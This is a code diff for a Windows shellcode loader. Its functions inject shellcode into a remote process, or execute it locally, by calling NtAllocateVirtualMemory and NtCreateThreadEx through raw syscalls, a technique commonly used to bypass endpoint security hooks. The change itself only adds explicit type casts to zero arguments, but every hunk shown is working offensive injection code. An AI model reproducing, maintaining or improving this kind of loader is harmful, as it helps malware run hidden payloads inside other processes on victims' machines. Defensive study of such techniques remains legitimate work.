@@ -106,7 +106,7 @@ BOOL InjectShellcodeSyscall(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T s
 
     // Allocate RW memory via syscall
     SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
-    status = RunSyscall(hProcess, &pRemoteAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    status = RunSyscall(hProcess, &pRemoteAddr, (ULONG_PTR)0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0x00 || !pRemoteAddr)
         return FALSE;
 
@@ -128,7 +128,8 @@ BOOL InjectShellcodeSyscall(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T s
 
     // Execute via NtCreateThreadEx
     SET_SYSCALL(g_Nt.NtCreateThreadEx);
-    status = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddr, NULL, FALSE, 0, 0, 0, NULL);
+    status = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddr, NULL,
+                        FALSE, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
     if (status != 0x00 || !hThread)
         return FALSE;
 
@@ -251,7 +252,7 @@ BOOL LocalShellcodeExecSyscall(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) 
 
     // Allocate RW
     SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
-    status = RunSyscall(hProcess, &pAddr, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    status = RunSyscall(hProcess, &pAddr, (ULONG_PTR)0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0x00 || !pAddr)
         return FALSE;
 
@@ -268,7 +269,8 @@ BOOL LocalShellcodeExecSyscall(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) 
 
     // Execute
     SET_SYSCALL(g_Nt.NtCreateThreadEx);
-    status = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddr, NULL, FALSE, 0, 0, 0, NULL);
+    status = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddr, NULL,
+                        FALSE, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
     if (status != 0x00 || !hThread)
         return FALSE;
 
